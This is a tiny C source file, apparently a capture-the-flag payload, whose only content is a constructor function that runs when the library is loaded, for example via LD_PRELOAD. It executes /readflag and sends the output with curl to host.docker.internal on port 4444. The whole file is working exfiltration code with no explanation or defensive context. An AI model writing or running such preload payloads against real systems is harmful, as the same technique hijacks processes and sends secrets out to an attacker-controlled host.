#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("curl host.docker.internal:4444 -d \"`/readflag`\"");
}